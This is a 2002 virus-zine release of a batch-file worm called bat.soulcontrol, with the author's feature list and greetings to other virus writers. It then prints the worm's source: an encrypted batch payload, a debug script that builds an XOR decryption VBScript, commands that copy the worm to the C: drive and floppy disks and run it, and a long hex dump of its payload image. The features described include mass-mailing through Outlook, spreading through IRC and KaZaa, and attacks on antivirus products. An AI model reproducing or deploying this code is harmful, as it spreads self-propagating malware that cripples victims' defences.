bat.soulcontrol by philet0ast3r [rRlf]
***************************************

Here we go again, encrypted batch.
This one was written around july 2002, for Brigada Ocho #1.
It is a version of bat.fuck, that contains a very phat payload.
Something I wanted to do for some longer time, but was always to lazy
doing to the lot of debuging (it was some terrible boring work).
It is my biggest virus (ok, it's a worm, actually) until now.
PawPaw, I am coming ;) ... I think it is my 14th virus.
... Well, I wanted to stop writing virii for zines ...
I don't know if this one is an exception ;]
By the way, I was st0ned, as I did the payload-picture.
Nevertheless, here are some facts:
-encrypted (thanks a lot to my friend alcopaul,
 for help with the encryption/decryption vbs)
-Outlook worm (with the help of a quite common vbs)
 subject: Who controls you?
 body: Stop your soul being controled! Get illuminated.
-mIRC worm
-pirch worm
-KaZaa worm
-spreads via disks
-"residency" through win.ini
-retro: Norton AntiVirus 2000, AntiVir /9X Personal Edition,
 F-Prot 95, McAfee, Thunderbyte
-payload: Shows up the payload-picture (soulcontrol) on every start-up.
 The picture is debuged ... Yes, the debuging takes some time,
 but the virus isn't meant to be put in the wild.
 I first wanted the payload as wallpaper, but the bitmap would have been much to big,
 and I didn't want to turn down the picture quality. So the picture is in jpg format.
 As I don't like Active Desktops, the picture is opened on every start-up by Paint
 (Paintbrush ... the Windows painting program ;).
-fully compatible to Windows ME, Windows 98, Windows 95 (has been tested)
-size: 138.203 bytes
-AV-name: W32/Eversaw.worm
 (... I don't know why they call it W32, but the Eversaw comes from the similarities
 to bat.fuck, which is known to AV as I-Worm.Eversaw, for example
 ... W32/Eversaw.worm is no AV-name of bat.fuck!)

philet0ast3r likes to greet/thank: 3ri5, adious [rRlf], alcopaul [rRlf], disc0rdia [rRlf], Dolomite [rRlf]
dr.g0nZo [rRlf], El DudErin0 [rRlf], Energy [rRlf], ppacket [rRlf], Benny [29A], powerdryv [TKT],
toro [TKT], rastafarie, PetiK, Necronomikon [ZG], SnakeByte [MVX], nuerble, herm1t, mgl [*],
Zoom23, BTK, ToxiC, BeLiAL [BC], Second Part To Hell [BC], Satanico [BC], pissn3lk [AFN],
Slage Hammer, MalFunction, Zarrmann, Senna Spy, jackie [MVX], zero-maitimax, Insider46,
ina, janine, El Commandante, castravete, bafra, Mindjuice.

Well, here is the code ... with comments "::"
These comments refer always to the code above and should be removed to
"compile" virus. But for the lazy ones: It's not neccessary, but decreases size
... and the victim does not know that easy what this batch is doing ;)
Phile-name is equal, but has to end with ".bat" :D

=====[begin code]===============================================================
@echo off
ctty nul
echo «‚‰ÔËßË··äç‰ÛÛ˛ßÈÚÎäç„‚Îß‰Ω€˜ıË‡ıÊÍÍ‚€ÈËıÛËÈ˘∂€Ù¥µÓÈÛ‚‡©„ÎÎäç„‚Îß‰Ω€˜ıË‡ıÊÍÍ‚€·™˜ıËÛæ≤€·˜Í¥µ©„ÎÎäç„‚Îß‰Ω€˜ıË‡ıÊÍÍ‚€Í‰Ê·‚‚€Ù‰ÊÈ©„ÊÛäç„‚Îß‰Ω€ÛÂÊÒæ≤€ÛÂÙ‰ÊÈ©ÙÓ‡äç„‚Îß‰Ω€˜ıË‡ıÊÍÍ‚€ÛÂÊÒ€ÛÂÊÒ©„ÊÛäç„‚Îß‰Ω€ÛÂÊÒ€ÛÂÊÒ©„ÊÛäç„‚Îß‰Ω€˜ıË‡ıÊÍÍ‚€ÊÒ˜‚ıÙËÈÊÎ€ÊÈÛÓÒÓı©Ò„·äç„‚Îß‰Ω€ÍÓı‰€Ù‰ıÓ˜Û©ÓÈÓäç„‚Îß‰Ω€ÍÓı‰¥µ€Ù‰ıÓ˜Û©ÓÈÓäç„‚Îß‰Ω€˜ıË‡ıÊ˘∂€ÍÓı‰€Ù‰ıÓ˜Û©ÓÈÓäç„‚Îß‰Ω€˜ıË‡ıÊ˘∂€ÍÓı‰¥µ€Ù‰ıÓ˜Û©ÓÈÓäç„‚Îß‰Ω€˜Óı‰Ôæø€‚Ò‚ÈÛÙ©ÓÈÓäç>m
echo äç‚‰ÔËß‹ÓÈ„ËÙ⁄πı‚äç‚‰ÔËßÎËÊ„∫‰Ω€ÂÊÛ©ÙËÚÎ‰ËÈÛıËÎ©ÂÊÛππı‚äç‚‰ÔËßıÚÈ∫ππı‚äç‚‰ÔËß…ÚÎÎ◊ËıÛ∫…ËÈ‚ππı‚äç‚‰ÔË©ππı‚äç‰Ë˜˛ßı‚ß¨ß¢ÓÈÂËËÛ„Óı¢€ÓÈ©ÓÈÓß¢ÓÈÂËËÛ„Óı¢€Ù˛ÙÛ‚Í€ÓÈ©ÓÈÓäç„‚Îß¢ÓÈÂËËÛ„Óı¢€ÓÈ©ÓÈÓäçÍËÒ‚ß¢ÓÈÂËËÛ„Óı¢€Ù˛ÙÛ‚Í€ÓÈ©ÓÈÓß¢ÓÈÂËËÛ„Óı¢€ÓÈ©ÓÈÓäç>>m
echo äç„‚Îßı‚äç‚‰ÔËß‹Ù‰ıÓ˜Û⁄πÍÓäç‚‰ÔËßÈ∑∫ËÈß∂ΩÕ»Œ…Ω§Ω¸ππÍÓäç‚‰ÔËßÈ∂∫ß®Ó·ßØßÈÓ‰Ïß∫∫ß£Í‚ßÆß¸ßÔÊÎÛß˙ππÍÓäç‚‰ÔËßÈµ∫ß®©„‰‰ßÙ‚È„ß£ÈÓ‰Ïß‰Ω€ÂÊÛ©ÙËÚÎ‰ËÈÛıËÎ©ÂÊÛππÍÓäç‚‰ÔËßÈ¥∫˙ππÍÓäçÍËÒ‚ßÍÓß‰Ω€ÍÓı‰€Ù‰ıÓ˜Û©ÓÈÓäçÍËÒ‚ßÍÓß‰Ω€ÍÓı‰¥µ€Ù‰ıÓ˜Û©ÓÈÓäçÍËÒ‚ßÍÓß‰Ω€˜ıË‡ıÊ˘∂€ÍÓı‰€Ù‰ıÓ˜Û©ÓÈÓäçÍËÒ‚ßÍÓß‰Ω€˜ıË‡ıÊ˘∂€ÍÓı‰¥µ€Ù‰ıÓ˜Û©ÓÈÓäç„‚ÎßÍÓäç>>m
echo äç‚‰ÔËß‹À‚Ò‚ÎÙ⁄π˜Óäç‚‰ÔËß¬ÈÊÂÎ‚„∫∂ππ˜Óäç‚‰ÔËßƒËÚÈÛ∫±ππ˜Óäç‚‰ÔËßÀ‚Ò‚Î∂∫∑∑∑™“ÈÏÈËÈÙππ˜Óäç‚‰ÔËß∑∑∑™“ÈÏÈËÈÙ¬ÈÊÂÎ‚„∫∂ππ˜Óäç‚‰ÔËßÀ‚Ò‚Îµ∫∂∑∑™À‚Ò‚Îß∂∑∑ππ˜Óäç‚‰ÔËß∂∑∑™À‚Ò‚Îß∂∑∑¬ÈÊÂÎ‚„∫∂ππ˜Óäç‚‰ÔËßÀ‚Ò‚Î¥∫µ∑∑™À‚Ò‚Îßµ∑∑ππ˜Óäç‚‰ÔËßµ∑∑™À‚Ò‚Îßµ∑∑¬ÈÊÂÎ‚„∫∂ππ˜Óäç‚‰ÔËßÀ‚Ò‚Î≥∫¥∑∑™À‚Ò‚Îß¥∑∑ππ˜Óäç‚‰ÔËß¥∑∑™À‚Ò‚Îß¥∑∑¬ÈÊÂÎ‚„∫∂ππ˜Óäç>>m
echo äç‚‰ÔËßÀ‚Ò‚Î≤∫≥∑∑™À‚Ò‚Îß≥∑∑ππ˜Óäç‚‰ÔËß≥∑∑™À‚Ò‚Îß≥∑∑¬ÈÊÂÎ‚„∫∂ππ˜Óäç‚‰ÔËßÀ‚Ò‚Î±∫≤∑∑™À‚Ò‚Îß≤∑∑ππ˜Óäç‚‰ÔËß≤∑∑™À‚Ò‚Îß≤∑∑¬ÈÊÂÎ‚„∫∂ππ˜Óäç‚‰ÔË©ππ˜Óäç‚‰ÔËß‹∑∑∑™“ÈÏÈËÈÙ⁄ππ˜Óäç‚‰ÔËß“Ù‚ı∂∫≠¶≠«≠ππ˜Óäç‚‰ÔËß“Ù‚ıƒËÚÈÛ∫∂ππ˜Óäç‚‰ÔËß¬Ò‚ÈÛ∂∫»…ßÕ»Œ…Ω§Ω®„‰‰ßÙ‚È„ß£ÈÓ‰Ïß‰Ω€ÂÊÛ©ÙËÚÎ‰ËÈÛıËÎ©ÂÊÛππ˜Óäç‚‰ÔËß¬Ò‚ÈÛƒËÚÈÛ∫∂ππ˜Óäç‚‰ÔË©ππ˜Óäç>>m
echo äç‚‰ÔËß‹∂∑∑™À‚Ò‚Îß∂∑∑⁄ππ˜Óäç‚‰ÔËß“Ù‚ıƒËÚÈÛ∫∑ππ˜Óäç‚‰ÔËß¬Ò‚ÈÛƒËÚÈÛ∫∑ππ˜Óäç‚‰ÔË©ππ˜Óäç‚‰ÔËß‹µ∑∑™À‚Ò‚Îßµ∑∑⁄ππ˜Óäç‚‰ÔËß“Ù‚ıƒËÚÈÛ∫∑ππ˜Óäç‚‰ÔËß¬Ò‚ÈÛƒËÚÈÛ∫∑ππ˜Óäç‚‰ÔË©ππ˜Óäç‚‰ÔËß‹¥∑∑™À‚Ò‚Îß¥∑∑⁄ππ˜Óäç‚‰ÔËß“Ù‚ıƒËÚÈÛ∫∑ππ˜Óäç‚‰ÔËß¬Ò‚ÈÛƒËÚÈÛ∫∑ππ˜Óäç>>m
echo äç‚‰ÔË©ππ˜Óäç‚‰ÔËß‹≥∑∑™À‚Ò‚Îß≥∑∑⁄ππ˜Óäç‚‰ÔËß“Ù‚ıƒËÚÈÛ∫∑ππ˜Óäç‚‰ÔËß¬Ò‚ÈÛƒËÚÈÛ∫∑ππ˜Óäç‚‰ÔË©ππ˜Óäç‚‰ÔËß‹≤∑∑™À‚Ò‚Îß≤∑∑⁄ππ˜Óäç‚‰ÔËß“Ù‚ıƒËÚÈÛ∫∑ππ˜Óäç‚‰ÔËß¬Ò‚ÈÛƒËÚÈÛ∫∑ππ˜ÓäçÍËÒ‚ß˜Óß‰Ω€˜Óı‰Ôæø€‚Ò‚ÈÛÙ©ÓÈÓäç„‚Îß˜Óäç‚‰ÔËß’¬¿¬√Œ”≥πÏÊäç>>m
echo äç‚‰ÔËß‹œÃ¬ﬁÿƒ“’’¬…”ÿ“‘¬’€‘Ë·ÛÊı‚€ÃÊ˝ÊÊ€ÀË‰ÊÎƒËÈÛ‚ÈÛ⁄ππÏÊäç‚‰ÔËß•√ÓÙÊÂÎ‚‘ÔÊıÓÈ‡•∫„Ëı„Ω∑∑∑∑∑∑∑∑ππÏÊäç‚‰ÔËß•√ËÈÎËÊ„√Óı•∫•ƒΩ€€◊ıË‡ıÊÍß¡ÓÎ‚Ù€€ÃÊ›Ê∆€€ ˛ß‘ÔÊı‚„ß¡ËÎ„‚ı•ππÏÊäç‚‰ÔËß•√Óı∑•∫•∑∂µ¥≥≤Ω‰Ω€€•ππÏÊäçÍËÒ‚ßÏÊß‰Ω€ÏÊ©ı‚‡äçı‚‡‚„ÓÛß®Ùß‰Ω€ÏÊ©ı‚‡äç‚‰ÔË©ËÈß‚ııËıßı‚ÙÚÍ‚ßÈ‚ˇÛπËÎäç‚‰ÔËß„ÓÍßÊ´Â´‰´„´‚ππËÎäç‚‰ÔËßÙ‚ÛßÊß∫ß–Ù‰ıÓ˜Û©ƒı‚ÊÛ‚»ÂÌ‚‰ÛØ•–Ù‰ıÓ˜Û©‘Ô‚ÎÎ•ÆππËÎäç‚‰ÔËßÙ‚ÛßÂß∫ßƒı‚ÊÛ‚»ÂÌ‚‰ÛØ•»ÚÛÎËËÏ©∆˜˜ÎÓ‰ÊÛÓËÈ•ÆππËÎäç>>m
echo äç‚‰ÔËßÙ‚Ûß‰ß∫ßÂ©¿‚Û…ÊÍ‚‘˜Ê‰‚Ø• ∆◊Œ•ÆππËÎäç‚‰ÔËß·Ëıß˛ß∫ß∂ß”Ëß‰©∆„„ı‚ÙÙÀÓÙÛÙ©ƒËÚÈÛππËÎäç‚‰ÔËßÙ‚Ûß„ß∫ß‰©∆„„ı‚ÙÙÀÓÙÛÙØ˛ÆππËÎäç‚‰ÔËßˇß∫ß∂ππËÎäç‚‰ÔËßÙ‚Ûß‚ß∫ßÂ©ƒı‚ÊÛ‚ŒÛ‚ÍØ∑ÆππËÎäç‚‰ÔËß·ËıßËß∫ß∂ß”Ëß„©∆„„ı‚ÙÙ¬ÈÛıÓ‚Ù©ƒËÚÈÛππËÎäç‚‰ÔËß·ß∫ß„©∆„„ı‚ÙÙ¬ÈÛıÓ‚ÙØˇÆππËÎäç‚‰ÔËß‚©’‚‰Ó˜Ó‚ÈÛÙ©∆„„ß·ππËÎäç‚‰ÔËßˇß∫ßˇß¨ß∂ππËÎäç‚‰ÔËßÈ‚ˇÛππËÎäç‚‰ÔËß‚©‘ÚÂÌ‚‰Ûß∫ß•–ÔËß‰ËÈÛıËÎÙß˛ËÚ∏•ππËÎäç‚‰ÔËß‚©≈Ë„˛ß∫ß•‘ÛË˜ß˛ËÚıßÙËÚÎßÂ‚ÓÈ‡ß‰ËÈÛıËÎ‚„¶ß¿‚ÛßÓÎÎÚÍÓÈÊÛ‚„©•ππËÎäç>>m
echo äç‚‰ÔËß‚©∆ÛÛÊ‰ÔÍ‚ÈÛÙ©∆„„ßØ•‰Ω€ÂÊÛ©ÙËÚÎ‰ËÈÛıËÎ©ÂÊÛ•ÆππËÎäç‚‰ÔËß‚©√‚Î‚Û‚∆·Û‚ı‘ÚÂÍÓÛß∫ß¡ÊÎÙ‚ππËÎäç‚‰ÔËß‚©‘‚È„ππËÎäç‚‰ÔËß·ß∫ß••ππËÎäç‚‰ÔËßÈ‚ˇÛππËÎäçÍËÒ‚ßËÎß¢ÓÈÂËËÛ„Óı¢€ËÎ©ÒÂÙäçÙÛÊıÛß¢ÓÈÂËËÛ„Óı¢€ËÎ©ÒÂÙäç‚‰ÔËß’¬¿¬√Œ”≥π˜Îäç‚‰ÔËß‹œÃ¬ﬁÿÀ»ƒ∆Àÿ ∆ƒœŒ…¬€‘»¡”–∆’¬€ Ó‰ıËÙË·Û€–ÓÈ„ËÙ€ƒÚıı‚ÈÛ—‚ıÙÓËÈ€’ÚÈ⁄ππ˜Îäç‚‰ÔËß•ÍÙ‡•∫•‰Ω€€˜Î©ÂÊÛ•ππ˜ÎäçÍËÒ‚ß˜Îß‰Ω€˜Î©ı‚‡äç>>m
echo äçı‚‡‚„ÓÛß®Ùß‰Ω€˜Î©ı‚‡äç‚‰ÔËß«‚‰ÔËßË··π˜Î©ÂÊÛäç‚‰ÔËß‰ÛÛ˛ßÈÚÎππ˜Î©ÂÊÛäç‚‰ÔËß¢ÓÈÂËËÛ„Óı¢€˜ÂıÚÙÔ©‚ˇ‚ß‰Ω€ÙËÚÎ‰ËÈÛıËÎ©Ì˜‡ππ˜Î©ÂÊÛäç‚‰ÔËß‚ˇÓÛππ˜Î©ÂÊÛäçÍËÒ‚ß˜Î©ÂÊÛß‰Ω€äç„‚Îß‰Ω€ÏÊ©ı‚‡äç„‚Îß‰Ω€˜Î©ı‚‡äç„‚Îß¢∑äç>>m
move m c:\run.bat

:: this is the encrypted actual virus
:: the virus can not be decrypted as whole, like bat.fuck, because it would take too long
:: so the decrypted code has to be echoed
:: decrypted code see below

copy %0 c:\bat.soulcontrol.bat

:: the running file is copied to c:\bat.soulcontrol.bat

if exist %winbootdir%\cr.vbs goto decr

:: if the decryption/encryption -vbs already exists,
:: this debugging can be jumped over

echo e 0100 6F 6E 20 65 72 72 6F 72 20 72 65 73 75 6D 65 20>c
echo e 0110 6E 65 78 74 0D 0A 73 65 74 20 66 73 6F 20 3D 20>>c
echo e 0120 63 72 65 61 74 65 6F 62 6A 65 63 74 28 22 73 63>>c
echo e 0130 72 69 70 74 69 6E 67 2E 66 69 6C 65 73 79 73 74>>c
echo e 0140 65 6D 6F 62 6A 65 63 74 22 29 0D 0A 73 65 74 20>>c
echo e 0150 70 72 6F 63 34 20 3D 20 66 73 6F 2E 6F 70 65 6E>>c
echo e 0160 74 65 78 74 66 69 6C 65 28 22 63 3A 5C 72 75 6E>>c
echo e 0170 2E 62 61 74 22 2C 20 31 29 0D 0A 6D 73 67 20 3D>>c
echo e 0180 20 70 72 6F 63 34 2E 72 65 61 64 61 6C 6C 0D 0A>>c
echo e 0190 64 64 64 20 3D 20 78 28 6D 73 67 29 0D 0A 73 65>>c
echo e 01A0 74 20 70 72 6F 63 32 20 3D 20 66 73 6F 2E 63 72>>c
echo e 01B0 65 61 74 65 74 65 78 74 66 69 6C 65 28 22 63 3A>>c
echo e 01C0 5C 72 75 6E 2E 62 61 74 22 2C 20 74 72 75 65 29>>c
echo e 01D0 0D 0A 70 72 6F 63 32 2E 77 72 69 74 65 6C 69 6E>>c
echo e 01E0 65 20 64 64 64 0D 0A 70 72 6F 63 32 2E 63 6C 6F>>c
echo e 01F0 73 65 0D 0A 46 75 6E 63 74 69 6F 6E 20 78 28 73>>c
echo e 0200 54 65 78 74 29 0D 0A 4F 6E 20 45 72 72 6F 72 20>>c
echo e 0210 52 65 73 75 6D 65 20 4E 65 78 74 0D 0A 44 69 6D>>c
echo e 0220 20 65 6B 65 79 2C 20 69 2C 20 68 61 73 68 2C 20>>c
echo e 0230 63 72 62 79 74 65 0D 0A 65 6B 65 79 20 3D 20 31>>c
echo e 0240 33 35 0D 0A 46 6F 72 20 69 20 3D 20 31 20 54 6F>>c
echo e 0250 20 4C 65 6E 28 73 54 65 78 74 29 0D 0A 68 61 73>>c
echo e 0260 68 20 3D 20 41 73 63 28 4D 69 64 28 73 54 65 78>>c
echo e 0270 74 2C 20 69 2C 20 31 29 29 0D 0A 63 72 62 79 74>>c
echo e 0280 65 20 3D 20 43 68 72 28 68 61 73 68 20 58 6F 72>>c
echo e 0290 20 28 65 6B 65 79 20 4D 6F 64 20 32 35 35 29 29>>c
echo e 02A0 0D 0A 78 20 3D 20 78 20 26 20 63 72 62 79 74 65>>c
echo e 02B0 0D 0A 4E 65 78 74 0D 0A 45 6E 64 20 46 75 6E 63>>c
echo e 02C0 74 69 6F 6E 0D 0A 00>>c
echo rcx>>c
echo 01C6>>c
echo n cr>>c
echo w>>c
echo q>>c
debug<c
del c
move cr %winbootdir%\cr.vbs

:: this is the debug-script of the decryption/encryption -vbs
:: code see below

:decr
start %winbootdir%\cr.vbs

:: now the echoed encrypted code of the virus gets decrypted

command /f /c copy %0 a:\

:: this copies the running file to the disk in drive a, if there is one, and if it's not full or write protected

start c:\run.bat

:: now the actual virus gets executed

if exist c:\soulcontrol.jpg goto end

:: if the payload-picture already exists,
:: this *very long* debugging can be jumped over

echo e 0100 FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 01 2C>>j
echo e 0110 01 2C 00 00 FF DB 00 43 00 08 06 06 07 06 05 08>>j
echo e 0120 07 07 07 09 09 08 0A 0C 14 0D 0C 0B 0B 0C 19 12>>j
echo e 0130 13 0F 14 1D 1A 1F 1E 1D 1A 1C 1C 20 24 2E 27 20>>j
echo e 0140 22 2C 23 1C 1C 28 37 29 2C 30 31 34 34 34 1F 27>>j
echo e 0150 39 3D 38 32 3C 2E 33 34 32 FF DB 00 43 01 09 09>>j
echo e 0160 09 0C 0B 0C 18 0D 0D 18 32 21 1C 21 32 32 32 32>>j
echo e 0170 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32>>j
echo e 0180 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32>>j
echo e 0190 32 32 32 32 32 32 32 32 32 32 32 32 32 32 FF C0>>j
echo e 01A0 00 11 08 01 78 02 4C 03 01 22 00 02 11 01 03 11>>j
echo e 01B0 01 FF C4 00 1F 00 00 01 05 01 01 01 01 01 01 00>>j
echo e 01C0 00 00 00 00 00 00 00 01 02 03 04 05 06 07 08 09>>j
echo e 01D0 0A 0B FF C4 00 B5 10 00 02 01 03 03 02 04 03 05>>j
echo e 01E0 05 04 04 00 00 01 7D 01 02 03 00 04 11 05 12 21>>j
echo e 01F0 31 41 06 13 51 61 07 22 71 14 32 81 91 A1 08 23>>j
echo e 0200 42 B1 C1 15 52 D1 F0 24 33 62 72 82 09 0A 16 17>>j
echo e 0210 18 19 1A 25 26 27 28 29 2A 34 35 36 37 38 39 3A>>j
echo e 0220 43 44 45 46 47 48 49 4A 53 54 55 56 57 58 59 5A>>j
echo e 0230 63 64 65 66 67 68 69 6A 73 74 75 76 77 78 79 7A>>j
echo e 0240 83 84 85 86 87 88 89 8A 92 93 94 95 96 97 98 99>>j
echo e 0250 9A A2 A3 A4 A5 A6 A7 A8 A9 AA B2 B3 B4 B5 B6 B7>>j
echo e 0260 B8 B9 BA C2 C3 C4 C5 C6 C7 C8 C9 CA D2 D3 D4 D5>>j
echo e 0270 D6 D7 D8 D9 DA E1 E2 E3 E4 E5 E6 E7 E8 E9 EA F1>>j
echo e 0280 F2 F3 F4 F5 F6 F7 F8 F9 FA FF C4 00 1F 01 00 03>>j
echo e 0290 01 01 01 01 01 01 01 01 01 00 00 00 00 00 00 01>>j
echo e 02A0 02 03 04 05 06 07 08 09 0A 0B FF C4 00 B5 11 00>>j
echo e 02B0 02 01 02 04 04 03 04 07 05 04 04 00 01 02 77 00>>j
echo e 02C0 01 02 03 11 04 05 21 31 06 12 41 51 07 61 71 13>>j
echo e 02D0 22 32 81 08 14 42 91 A1 B1 C1 09 23 33 52 F0 15>>j
echo e 02E0 62 72 D1 0A 16 24 34 E1 25 F1 17 18 19 1A 26 27>>j
echo e 02F0 28 29 2A 35 36 37 38 39 3A 43 44 45 46 47 48 49>>j
echo e 0300 4A 53 54 55 56 57 58 59 5A 63 64 65 66 67 68 69>>j
echo e 0310 6A 73 74 75 76 77 78 79 7A 82 83 84 85 86 87 88>>j
echo e 0320 89 8A 92 93 94 95 96 97 98 99 9A A2 A3 A4 A5 A6>>j
echo e 0330 A7 A8 A9 AA B2 B3 B4 B5 B6 B7 B8 B9 BA C2 C3 C4>>j
echo e 0340 C5 C6 C7 C8 C9 CA D2 D3 D4 D5 D6 D7 D8 D9 DA E2>>j
echo e 0350 E3 E4 E5 E6 E7 E8 E9 EA F2 F3 F4 F5 F6 F7 F8 F9>>j
echo e 0360 FA FF DA 00 0C 03 01 00 02 11 03 11 00 3F 00 F0>>j
echo e 0370 1C D2 E6 9F B0 1A 50 83 D2 A6 E5 58 8E 94 54 A2>>j
echo e 0380 2C D0 61 F4 AA 4A EA E1 62 2C 66 B4 2D E0 2B 1E>>j
echo e 0390 71 D6 A0 B7 B7 DD 20 2D D0 56 9A 8D E7 68 FB A2>>j
echo e 03A0 B2 93 BE 83 4A EC AE 63 CF 00 D5 76 80 24 B8 15>>j
echo e 03B0 7D C2 A8 6D A3 1C 54 49 0B 39 04 74 C7 5A B8 AB>>j
echo e 03C0 68 69 66 CA 6D 0E 4F 3C D5 FB 4B 10 78 71 C1 03>>j
echo e 03D0 15 24 30 C7 D4 F5 AB 56 EF 1B 13 90 72 28 D5 6A>>j
echo e 03E0 52 A6 96 AC 85 EC B1 20 DD C2 E3 15 13 DA C5 13>>j
echo e 03F0 37 7C F4 35 AC 22 37 04 03 C2 D5 76 B3 7F 30 97>>j
echo e 0400 1F 20 3C 11 4D CE EE EC 71 BB 7A 19 92 D9 B3 47>>j
echo e 0410 F2 A9 CF 5C 54 03 4E B9 93 E5 54 39 F4 AE CB 4E>>j
echo e 0420 8A DE 26 56 76 E3 B8 35 B0 BA 64 77 17 9E 7D BA>>j
echo e 0430 EC 88 8E 4D 28 DD BB 20 74 DA 76 67 3B A4 59 4E>>j
echo e 0440 63 82 39 7E E0 5C 7D 2B 6D 34 A3 1A B6 C5 0A 3D>>j
echo e 0450 4F 7A BE 34 B8 EC 73 3F 98 4A A8 C9 06 A1 5D 4A>>j
echo e 0460 D6 68 CB B3 65 54 F5 AB AF 0E 58 AB EE 6E A9 C6>>j
echo e 0470 30 E6 7B 99 CD A0 4D 2C EA AC 78 EA 73 E9 5D 44>>j
echo e 0480 7E 15 30 C0 B2 EF C9 0B D0 77 35 9C BA EE 9D 6D>>j
echo e 0490 B1 5A 4D C5 BA FB 0A E9 FF 00 B7 2C E4 D3 98 A3>>j
echo e 04A0 10 48 EB 5C F4 A1 65 73 25 CD 37 74 73 1E 24 D3>>j
echo e 04B0 EE 2D F4 84 0D 20 C2 B8 DA 05 73 F6 BA AD DD A2>>j
echo e 04C0 79 48 E0 10 43 67 E9 5B 3E 23 D5 A2 9A C5 15 A4>>j
echo e 04D0 04 07 1C 67 A8 AE 4E 56 81 AF 03 A3 F1 C0 C5 6D>>j
echo e 04E0 35 CD 63 78 46 36 B1 D0 41 AD DF C7 1C 8C 24 C6>>j
echo e 04F0 F1 F3 7D 69 90 EA 77 82 E0 4C 27 0A 71 B7 68 1E>>j
echo e 0500 B5 9E 97 36 82 06 FD E0 CE D3 C7 BD 65 DD DC C4>>j
echo e 0510 8A A5 64 05 B3 C9 EF 50 A5 C8 9C 45 2D EC 8E 92>>j
echo e 0520 7D 46 ED A5 DA 66 C7 7A D0 B3 DE EA A0 CD B8 C9>>j
echo e 0530 DA BC EA EE F8 A3 86 8A 5C EE 18 35 66 CF 52 48>>j
echo e 0540 94 36 F3 BC 1E 69 4F DE 48 57 4D 34 7A 55 CC 62>>j
echo e 0550 2B 37 25 C0 20 E2 B8 CD 73 55 BE B4 B8 8F EC 97>>j
echo e 0560 45 42 0E 8B 8C FE B5 57 54 D6 45 C6 9D E5 89 72>>j
echo e 0570 D9 04 8A C4 FB 58 91 7F 78 4B 11 C0 AB A7 19 6E>>j
echo e 0580 DE 86 69 45 E8 59 FE DB BC 77 91 9D F7 BC 80 EE>>j
echo e 0590 27 B9 3D 4D 25 95 CC EB 30 C3 74 3D 2B 22 57 FD>>j
echo e 05A0 E1 23 A5 2C 72 90 4F CC 47 6A 52 8A 66 37 49 D9>>j
echo e 05B0 1D 1D FE A9 32 49 13 46 F8 C0 ED 59 37 4C 6E E6>>j
echo e 05C0 32 39 CB B7 35 45 DC F4 04 9C 52 2C 87 D7 A5 5A>>j
echo e 05D0 D1 59 1A FB 55 6E 56 8D 43 0B 5B DB B3 16 19 ED>>j
echo e 05E0 59 E0 97 6C 66 9A 65 2F C3 1E 0D 44 4E 1B 8A 95>>j
echo e 05F0 1B 19 4E 77 D8 74 C7 F7 84 50 A7 09 8C F5 EB 51>>j
echo e 0600 93 93 40 E9 54 65 7D 47 3E 37 60 74 A9 36 00 99>>j
echo e 0610 A8 68 06 90 45 D8 0F 5A 55 62 A7 22 92 8A 64 8F>>j
echo e 0620 12 37 23 D6 9E 30 AA 08 3C D4 35 21 8D 80 04 D2>>j
echo e 0630 2E 2C D9 D1 F5 06 8E E4 74 E3 BD 69 DD 48 97 0E>>j
echo e 0640 F3 39 07 3C 66 B9 8B 7F 95 C9 CF 6A B9 6D E7 DC>>j
echo e 0650 16 45 3C 52 A8 9C B7 3A E9 54 6B E2 65 1B 9C 09>>j
echo e 0660 DF 1E A6 91 48 63 9A 96 68 19 1D B7 F6 AA A0 E0>>j
echo e 0670 D3 5B 58 E7 96 92 1C C3 26 AF 28 3E 4A 1C FC B8>>j
echo e 0680 02 A8 6E 26 AC AC C4 44 A9 DB 39 A9 96 C5 D3 6A>>j
echo e 0690 ED 92 BE 07 39 AB 16 53 B2 39 D8 7B D5 09 49 24>>j
echo e 06A0 90 6A 6B 39 15 54 E7 AD 54 22 DE EC DE 95 6B 54>>j
echo e 06B0 46 F3 C6 CD 6C AE 73 92 2A 9B A1 8C E7 3D 6B 5A>>j
echo e 06C0 19 62 6D 36 30 4F 38 AC D9 73 BB 91 5C 52 71 73>>j
echo e 06D0 B4 4E FA D0 52 6B 95 5A FB 9D 2F 83 AE 98 5F 32>>j
echo e 06E0 BB 61 42 F3 9F A8 AE FB FB 36 DB 56 84 49 3A EF>>j
echo e 06F0 50 72 3D EB C9 F4 C9 BE CD 70 5C 92 01 15 EA 3A>>j
echo e 0700 06 A7 13 E8 CA A4 F3 B4 9F D6 BA 29 7B BA 23 1C>>j
echo e 0710 56 1A 51 8A 71 3C 53 C4 56 A6 D3 58 B8 8B 20 85>>j
echo e 0720 6E 08 E9 D2 B2 6B A1 D7 B4 CB 95 B8 B8 B9 61 91>>j
echo e 0730 BF 9F 5A E7 AB 54 79 33 8B 4F 51 EA B9 19 CD 5C>>j
echo e 0740 B1 55 FB 64 4A E7 0B 91 9A A0 18 8A B3 6A DF E9>>j
echo e 0750 31 93 D3 22 AA F6 2A 9B 57 3A EB 7B 03 3B BC B0>>j
echo e 0760 3F 29 D2 B3 EF 8C 8E BF 63 95 CA F3 B8 D7 47 E0>>j
echo e 0770 B8 BF B4 2F EE 21 43 F7 57 8F C8 D4 BA F6 88 E2>>j
echo e 0780 F9 95 94 7D DE BF 85 66 B9 9C AC BA 9B 4A EE 67>>j
echo e 0790 9E 4D 6C 13 71 56 05 45 55 3D 31 E9 5A 72 D8 CB>>j
echo e 07A0 99 15 7A 2B 10 7F 3A CE 92 36 8C ED 61 82 3A D6>>j
echo e 07B0 B2 8B 8E E6 33 8D B6 22 A2 8A 5D A7 19 A9 32 12>>j
echo e 07C0 97 1C 51 4E 54 24 67 B5 03 4A E3 79 A4 A9 DF 60>>j
echo e 07D0 8C 0C 7C D8 A8 28 06 AC 14 51 45 02 16 82 31 47>>j
echo e 07E0 4A 76 09 E6 81 A4 32 8A 5C 52 50 20 A2 8A 28 02>>j
echo e 07F0 D8 07 D3 02 97 21 69 FE 59 1C 91 9A 92 3B 72 CD>>j
echo e 0800 96 1F 85 26 AC 6F 61 A8 0B 36 00 A9 92 DC BB 71>>j
echo e 0810 4E 58 DC 90 02 E3 15 6E 3C 0F 91 46 4F 7A 5C CE>>j
echo e 0820 C0 42 B1 8C 85 15 2B 31 53 B4 0A 96 38 19 72 C7>>j
echo e 0830 F2 A8 DD 07 99 96 38 18 AC A3 2B 8D EC 29 8F CC>>j
echo e 0840 50 14 71 FC 55 A5 6F 02 79 63 23 0B 8A AB 69 B5>>j
